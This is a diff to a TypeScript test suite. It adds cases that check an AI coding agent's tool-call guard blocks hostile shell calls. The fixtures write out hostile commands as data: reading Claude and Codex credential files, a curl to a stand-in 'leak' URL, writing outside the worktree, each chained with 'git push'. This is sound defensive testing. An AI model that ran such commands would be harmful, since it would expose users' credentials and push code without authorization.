@@ -12,7 +12,8 @@
  * Tool-call guard (T4.56, ADR-0039): in an approved bypass run Switchboard's own tool-call guard enforces Git-write
  * denial across the hostile streams, ending `PERMISSION_BLOCKED` at exit 0 and at exit 1 (owner decision 25), including
  * a `completed` tool call inside a multi-step run (row 5) and a hostile tool call after the final `stop` step in every
- * hostile category (Q-85). A bare or unreadable trailing `tool_use` ends `OUTPUT_PROTOCOL_ERROR`; it is not a hostile
+ * hostile category (Q-85), each at exit 0 and exit 1 across the categories, a run that never reaches a `stop` step, and
+ * a hostile call followed by a provider `error` line (row 14b). A bare or unreadable trailing `tool_use` ends `OUTPUT_PROTOCOL_ERROR`; it is not a hostile
  * category stream here (those must end blocked), so `src/adapters/opencode/opencode.test.ts` pins it.
  */
 
@@ -228,6 +229,82 @@ const opencodeCase: AdapterLegCase = {
         STEP_START,
         completed("shell", { command: `cat ${fx.claudeCredentialsPath} && git push origin main` }),
         TOOL_STEP,
+      ],
+    },
+    {
+      name: "completed shell write outside the worktree, then a final stop step, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("completed shell write outside the worktree, then a final stop step, exit 1", 1),
+        STEP_START,
+        completed("shell", { command: `touch ${fx.outsideSentinel} && git push origin main` }),
+        TOOL_STEP,
+        STEP_START,
+        REPORT,
+        STOP,
+      ],
+    },
+    {
+      name: "completed shell network call, then a final stop step",
+      category: "network",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("completed shell network call, then a final stop step", 0),
+        STEP_START,
+        completed("shell", { command: "curl https://example.invalid/leak && git push origin main" }),
+        TOOL_STEP,
+        STEP_START,
+        event("text", { type: "text", text: "Done." }),
+        STOP,
+      ],
+    },
+    {
+      name: "shell read of a credential path after the final stop step, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path after the final stop step, exit 1", 1),
+        STEP_START,
+        REPORT,
+        STOP,
+        refused("shell", { command: `cat ${fx.codexAuthPath} && git push origin main` }),
+      ],
+    },
+    {
+      // A run that never reaches a `stop` step (it ends on the intermediate `tool-calls` step) is not a success anyway
+      // (Q-85); the guard verdict keeps its own code rather than the no-result OUTPUT_PROTOCOL_ERROR.
+      name: "completed shell write outside the worktree with no final stop step",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("completed shell write outside the worktree with no final stop step", 0),
+        STEP_START,
+        completed("shell", { command: `touch ${fx.outsideSentinel} && git push origin main` }),
+        TOOL_STEP,
+      ],
+    },
+    {
+      // Row 14b's `error` line after a hostile call: the guard verdict outranks the provider error's QUOTA_EXHAUSTED
+      // (shared precedence, ADR-0039).
+      name: "shell network call, then a provider quota error, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call, then a provider quota error, exit 1", 1),
+        STEP_START,
+        completed("shell", { command: "curl https://example.invalid/leak && git push origin main" }),
+        JSON.stringify({
+          type: "error",
+          timestamp: 1_760_000_000_000,
+          sessionID: SID,
+          error: { type: "provider.quota", message: "SYNTHETIC: quota exhausted" },
+        }),
       ],
     },
     {
